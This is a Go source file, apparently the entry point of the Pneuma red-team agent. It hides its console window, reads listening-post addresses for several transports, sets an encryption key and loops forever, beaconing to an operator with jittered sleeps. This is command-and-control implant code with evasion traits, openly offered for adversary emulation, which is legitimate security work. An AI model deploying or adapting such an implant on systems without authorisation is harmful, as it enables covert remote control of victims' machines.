package main

import (
	"flag"
	"github.com/preludeorg/pneuma/channels"
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	//_ "net/http/pprof"
	"os"
	"strings"
	"sync"
)

var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"

func init() {
	util.HideConsole()

	// Set up the channels used in the main goroutines.
	channels.InitChannels()
}

func main() {
	agent := util.BuildAgentConfig()
	name := flag.String("name", agent.Name, "Give this agent a name")
	//contact := flag.String("contact", agent.Contact, "Which contact to use")
	//address := flag.String("address", agent.Address, "The ip:port of the socket listening post")
	udp := flag.String("udp", agent.UDP, "The ip:port of the socket listening post")
	tcp := flag.String("tcp", agent.TCP, "The ip:port of the socket listening post")
	http := flag.String("http", agent.HTTP, "The ip:port of the socket listening post")
	grpc := flag.String("grpc", agent.GRPC, "The ip:port of the socket listening post")
	p2p := flag.String("p2p", agent.P2P, "The GossipSub topic.")
	group := flag.String("range", agent.Range, "Which range to associate to")
	sleep := flag.Int("sleep", agent.Sleep, "Number of seconds to sleep between beacons")
	jitter := flag.Int("jitter", agent.CommandJitter, "Number of seconds to sleep between beacons")
	useragent := flag.String("useragent", agent.Useragent, "User agent used when connecting (HTTP/S only)")
	proxy := flag.String("proxy", agent.Proxy, "Set a proxy URL target (HTTP/S only)")
	util.DebugMode = flag.Bool("debug", agent.Debug, "Write debug output to console")
	flag.Parse()

	// Initialize the AgentConfig from cli flags
	agent.SetAgentConfig(map[string]interface{}{
		"Name": *name,
		//"Contact": *contact,
		//"Address": *address,
		"TCP":           *tcp,
		"UDP":           *udp,
		"HTTP":          *http,
		"GRPC":          *grpc,
		"P2P":           *p2p,
		"Range":         *group,
		"Useragent":     *useragent,
		"Sleep":         *sleep,
		"Proxy":         *proxy,
		"CommandJitter": *jitter,
	})

	for contact, address := range agent.Contact {
		if len(address) > 0 {
			if !strings.Contains(address, ":") {
				util.DebugLogf("Your %s address is incorrect\n", contact)
				os.Exit(1)
			}
		}
	}

	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent

	if *util.DebugMode {
		util.ShowConsole()
	}

	// Set up the channel operation managers.
	go channels.InitAgentConfigManager(agent)
	go channels.InitBeaconManager()
	go channels.InitEnvelopeManager(sockets.EnvelopeHandler)
	go channels.InitLinkCacheManager()
	go channels.InitConnectionManager()

	// TODO: Remove profiler and net/http/pprof import
	//go func() {log.Println(http.ListenAndServe("localhost:6060", nil))}()

	for {
		// Wait for each contact's EventLoop to complete before sending the next beacon.
		var wg sync.WaitGroup

		// Refresh contacts as they may be updated or removed.
		a := channels.ReadAgentConfig()

		// Refresh the connections to prevent spawning an event loop for closed connections.
		_ = channels.RefreshConnections()

		connections := channels.ReadConnections()

		// Read from Beacon chan to send current data.
		beacon := channels.ReadBeacon("tcp")

		// Send the beacon out on each transport.
		for _, conn := range connections {
			wg.Add(1)

			b := beacon
			b.Target = a.Contact[conn.Type]

			// Construct the Envelope that holds the Beacon and the Connection.
			envelope := util.BuildEnvelope(beacon, conn)

			// EnvelopeForwarder passes the beacon to the connection send channel.
			go util.EnvelopeForwarder(conn, envelope, &wg)
		}
		wg.Wait()

		// Remove Links that were executed and sent to Operator.
		channels.TrimBeaconLinks()

		util.JitterSleep(a.Sleep, "JITTER")
	}
}
